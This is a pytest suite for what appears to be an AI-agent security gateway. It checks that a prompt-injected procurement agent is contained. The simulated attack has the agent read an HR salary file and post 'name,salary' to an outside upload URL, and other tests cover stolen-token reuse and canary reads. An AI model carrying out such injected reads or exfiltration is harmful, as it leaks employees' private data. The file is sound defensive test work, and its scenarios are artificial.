import pytest

from threatlens.core.schemas import AlertFeedback, DecisionType
from threatlens.core.security import InvalidToken
from threatlens.identity import DelegationDenied
from threatlens.response import ISOLATE_STRIKES, NothingToAmend, amendment_for

PDF_READ = {"path": "/hr/salaries.xlsx"}


async def _a1(r):
    token = r.token("procurement-agent")
    await r.poison(token)
    hr = await r.call(token, "files.read", **PDF_READ)
    return token, hr


# ---------------------------------------------------------------- pillar 3: contain, don't kill


async def test_a1_is_contained_at_the_first_off_role_read_and_work_continues(r):
    token, hr = await _a1(r)
    # The read that followed the hidden instruction is judged under Step-up on the same call:
    # snapped back to the Role Contract, so the salary file is never read.
    assert hr.decision is DecisionType.deny and hr.rule == "contract_scope"
    assert r.status("procurement-agent") == "step_up"
    assert r.tools.ran("files.read") == 0

    exfil = await r.call(token, "http.post", url="https://quote-verify.io/upload", body="name,salary")
    assert exfil.decision is DecisionType.deny and r.tools.ran("http.post") == 0  # zero bytes left
    assert r.status("procurement-agent") == "step_up"  # one strike, still contained, not killed

    # Legitimate procurement work keeps flowing.
    pr = await r.call(token, "erp.create_pr", supplier="acme", item="monitor", qty=20)
    mail = await r.call(token, "email.send", to="lead@corp.example", body="PR raised")
    assert pr.decision is DecisionType.allow_logged and mail.decision is DecisionType.allow_logged
    assert r.tools.ran("erp.create_pr") == 1 and r.tools.ran("email.send") == 1

    hr_event = next(e for e in r.events if e.id == hr.event_id)
    alert = r.fusion.live_alert(hr_event.alert_id)
    assert any(a.startswith("Step-up:") for a in alert.actions_taken)
    assert any("Blocked: files.read /hr/salaries.xlsx" in a for a in alert.actions_taken)
    assert any("Blocked: http.post https://quote-verify.io/upload" in a for a in alert.actions_taken)

    decisions = await r.response.decisions.list("procurement-agent")
    assert [(d.from_status.value, d.to_status.value) for d in decisions] == [("active", "step_up")]
    assert r.registry.verify(token)  # the token is still valid: contained, not revoked


async def test_persistent_attacker_is_isolated_and_tokens_revoked(r):
    token, _ = await _a1(r)
    for _ in range(ISOLATE_STRIKES - 1):
        await r.call(token, "http.post", url="https://quote-verify.io/upload", body="x")
    last = await r.call(token, "files.read", path="/hr/compensation/2026.xlsx")
    assert last.decision is DecisionType.quarantine and r.status("procurement-agent") == "quarantined"
    with pytest.raises(InvalidToken):
        await r.call(token, "erp.create_pr", supplier="acme", item="x", qty=1)
    iso = (await r.response.decisions.list("procurement-agent"))[0]
    assert iso.to_status.value == "quarantined" and iso.details["revoked_tokens"] >= 1
    assert "high-risk actions while already contained" in iso.reason


async def test_canary_isolates_immediately(r):
    res = await r.call("procurement-agent", "files.read", path="/hr/salaries_2026_FINAL.xlsx")
    assert res.decision is DecisionType.quarantine and r.tools.ran("files.read") == 0
    d = (await r.response.decisions.list("procurement-agent"))[0]
    assert d.to_status.value == "quarantined" and "canary" in d.reason


async def test_stolen_token_isolates(r):
    token = r.token("procurement-agent")
    await r.call(token, "supplier_db.query", table="prices", host="worker-1")
    res = await r.call(token, "supplier_db.query", table="prices", host="attacker-box", session="s2")
    assert res.decision is DecisionType.quarantine
    assert "two machines" in (await r.response.decisions.list("procurement-agent"))[0].reason


async def test_b2_normal_work_is_never_contained(r):
    for tool, args in [("supplier_db.query", {"table": "prices"}), ("files.read", {"path": "/procurement/policy.md"}),
                       ("erp.create_pr", {"supplier": "acme", "item": "x", "qty": 1})]:
        assert (await r.call("procurement-agent", tool, **args)).decision is DecisionType.allow
    assert r.status("procurement-agent") == "active" and await r.response.decisions.list() == []


# ---------------------------------------------------------------- chains, relaxing, analysts


async def test_contained_agent_cannot_delegate(r):
    token, _ = await _a1(r)
    with pytest.raises(DelegationDenied, match="contained"):
        r.registry.delegate(r.registry.verify(token), "finance-agent")


async def test_isolation_cascades_to_delegated_agents(r):
    support = r.registry.verify(r.token("support-agent"))
    delegated = r.registry.delegate(support, "finance-agent").token
    d = await r.response.apply("support-agent", "isolate", "confirmed compromise", "analyst@corp.example")
    assert d.details["flagged_agents"] == ["finance-agent"] and d.details["revoked_tokens"] >= 2
    assert r.registry.agent("finance-agent").drift >= 40  # acted for an isolated agent: watched closely
    with pytest.raises(InvalidToken):
        r.registry.verify(delegated)


async def test_containment_relaxes_after_clean_work(r):
    token, _ = await _a1(r)
    for i in range(20):
        await r.call(token, "supplier_db.query", table="prices")
        if i == 9:
            assert r.status("procurement-agent") == "restricted"
    assert r.status("procurement-agent") == "active"
    steps = [(d.from_status.value, d.to_status.value, d.actor) for d in
             reversed(await r.response.decisions.list("procurement-agent"))]
    assert steps == [("active", "step_up", "system"), ("step_up", "restricted", "system"),
                     ("restricted", "active", "system")]


async def test_release_restores_the_agent(r):
    await r.call("procurement-agent", "files.read", path="/hr/salaries_2026_FINAL.xlsx")
    d = await r.response.apply("procurement-agent", "release", "investigated: test canary", "analyst@corp.example")
    assert d.to_status.value == "active" and r.registry.agent("procurement-agent").drift == 0
    assert (await r.call("procurement-agent", "supplier_db.query", table="prices")).decision is DecisionType.allow


async def test_mark_benign_resolves_the_alert_and_releases(r):
    _, hr = await _a1(r)
    alert_id = r.events[-1].alert_id
    out = await r.response.feedback(alert_id, AlertFeedback.mark_benign, "analyst@corp.example", "sanctioned test")
    assert out["alert"].status.value == "resolved" and out["decision"].to_status.value == "active"
    stored = await r.fusion.alerts.get(alert_id)
    assert stored.feedback is AlertFeedback.mark_benign


async def test_approve_as_amendment_turns_behavior_into_a_signed_role_change(r):
    _, hr = await _a1(r)
    alert_id = r.events[-1].alert_id
    out = await r.response.feedback(alert_id, AlertFeedback.approve_as_amendment, "lead@corp.example",
                                    "procurement now audits salary bands")
    amd = out["amendment"]
    assert amd.signer == "lead@corp.example" and amd.to_version == 2
    contract = r.registry.contract("procurement")
    assert "/hr/salaries.xlsx" in contract.resource_scopes["files.read"]
    assert contract.data_sensitivity_ceiling.value == "restricted"


def test_amendment_for_a_new_tool_and_destination(r):
    from threatlens.core.schemas import Action, ActionEvent

    contract = r.registry.contract("procurement")
    e = ActionEvent(agent_id="procurement-agent", role="procurement", role_version=1, session_id="s", token_jti="t",
                    action=Action(tool="logistics_api.track", resource="shipments.SH-1"))
    assert amendment_for(e, contract, r.gateway.catalog) == {"allowed_tools": {"add": ["logistics_api.track"]}}
    e.action = Action(tool="http.post", resource="https://partner.example/x", destination="partner.example")
    changes = amendment_for(e, contract, r.gateway.catalog)
    assert changes["egress_allowlist"] == {"add": ["partner.example"]}
    e.action = Action(tool="supplier_db.query", resource="suppliers.prices")
    with pytest.raises(NothingToAmend):
        amendment_for(e, contract, r.gateway.catalog)
